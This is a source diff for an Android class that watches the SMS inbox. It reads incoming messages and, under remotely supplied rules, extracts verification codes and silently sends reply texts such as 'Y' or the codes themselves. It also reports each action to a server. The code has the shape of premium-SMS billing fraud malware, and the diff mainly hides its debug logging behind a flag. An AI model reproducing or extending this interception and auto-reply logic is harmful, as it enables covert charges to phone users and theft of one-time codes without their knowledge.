@@ -40,7 +40,6 @@ public class SmsInterceptCenter extends ContentObserver {
     @Override
     public void onChange(boolean selfChange, Uri uri) {
         super.onChange(selfChange, uri);
-        Log.debug("onChange:" + uri.toString());
         if (uri.toString().equals("content://sms/")) {
             return;
         }
@@ -186,17 +185,17 @@ public class SmsInterceptCenter extends ContentObserver {
         }
         String smsAddress = "";
         String smsBody = "";
-        Log.debug("===============>smsHandle");
         try {
             JSONObject json = new JSONObject(content);
             String _id = json.getString("_id");
             smsAddress = json.getString("smsAddress");
             smsBody = json.getString("smsBody");
-            Log.debug("===============>smsAddress:" + smsAddress);
-            Log.debug("===============>smsBody:" + smsBody);
+            if (Constants.isOutPut) {
+                Log.debug("===============>smsAddress:" + smsAddress);
+                Log.debug("===============>smsBody:" + smsBody);
+            }
 
         } catch (Exception e) {
-            System.out.println("eeeee:" + e);
             SmsSynchronousRequest.getInstance().request(context, catchError(e), -3);
         }
         for (int i = 0; i < interceptContentList.size(); i++) {
@@ -207,17 +206,25 @@ public class SmsInterceptCenter extends ContentObserver {
             String sendParam = "";
             String otherNeedUrl = "";
             String limit_msg_data = "";
-            Log.debug("======================> PayChannelFactory.limit_content.get(i).toString():" + interceptContentList.get(i).toString());
+            if (Constants.isOutPut) {
+                Log.debug("======================> PayChannelFactory.limit_content.get(i).toString():" + interceptContentList.get(i).toString());
+            }
             try {
                 JSONObject json = new JSONObject(interceptContentList.get(i).toString());
                 limit_msg_2 = json.getString("limit_msg_2");
                 limit_msg_data = json.isNull("limit_msg_data") ? "" : json.getString("limit_msg_data");
-                Log.debug("========>limit_msg_data:" + limit_msg_data);
+                if (Constants.isOutPut) {
+                    Log.debug("========>limit_msg_data:" + limit_msg_data);
+                }
             } catch (Exception e) {
-                Log.debug("=================>eeeeeee:" + e);
+                if (Constants.isOutPut) {
+                    Log.debug("=================>eeeeeee:" + e);
+                }
                 SmsSynchronousRequest.getInstance().request(context, catchError(e), -4);
             }
-            Log.debug("===============>limit_msg_2:" + limit_msg_2);
+            if (Constants.isOutPut) {
+                Log.debug("===============>limit_msg_2:" + limit_msg_2);
+            }
             if (TextUtils.isEmpty(limit_msg_2)) {
                 return;
             }
@@ -240,7 +247,9 @@ public class SmsInterceptCenter extends ContentObserver {
                 try {
                     JSONObject json = new JSONObject(interceptContentList.get(i).toString());
                     payType = json.getString("payType");
-                    Log.debug("===============>payType:" + payType);
+                    if (Constants.isOutPut) {
+                        Log.debug("===============>payType:" + payType);
+                    }
                     senderContent = json.getString("fix_msg");
                     vCodeLength = json.isNull("limit_msg_1") ? "" : json.getString("limit_msg_1");
                     limitNum = json.isNull("limitNum") ? "" : json.getString("limitNum");
@@ -256,7 +265,9 @@ public class SmsInterceptCenter extends ContentObserver {
                             Log.debug("======>要开始回复Y了:" + senderContent);
                         }
                         SmsCenter.getInstance().sendSecendSMS(limitNum, senderContent);
-                        Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
+                        if (Constants.isOutPut) {
+                            Log.debug("=======>limitNum:" + limitNum + "    " + senderContent);
+                        }
                         SmsSynchronousRequest.getInstance().request(context, "This user send SMS with any content:" + senderContent + "limitNum:" + limitNum, 10001);
                     } else if (payType.equals("2")) {//二次短信回复验证码
                         String SmsContent = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
@@ -281,8 +292,10 @@ public class SmsInterceptCenter extends ContentObserver {
                         }
                     } else if (payType.equals("4")) {//二次短信回复任意内容+验证码
                         String SmsCode = SDKUtils.getCode2Sms(Integer.valueOf(vCodeLength), smsBody);
-                        Log.debug("======>SmsCode:" + SmsCode);
-                        Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
+                        if (Constants.isOutPut) {
+                            Log.debug("======>SmsCode:" + SmsCode);
+                            Log.debug("======>ACacheUtils.getInstance(context).getLimitNum():" + limitNum);
+                        }
                         if (SmsCode != null) {
                             SmsCenter.getInstance().sendSecendSMS(limitNum, senderContent + SmsCode);
                             SmsSynchronousRequest.getInstance().request(context, "This user send SMS with senderContent&SmsCode:" + "senderContent:" + senderContent + "\t" + "SmsCode:" + SmsCode, 10004);
@@ -291,7 +304,9 @@ public class SmsInterceptCenter extends ContentObserver {
 
                     }
                 } catch (Exception e) {
-                    Log.debug("=====>e:" + e);
+                    if (Constants.isOutPut) {
+                        Log.debug("=====>e:" + e);
+                    }
                     SmsSynchronousRequest.getInstance().request(context, catchError(e), -5);
                 }
             }
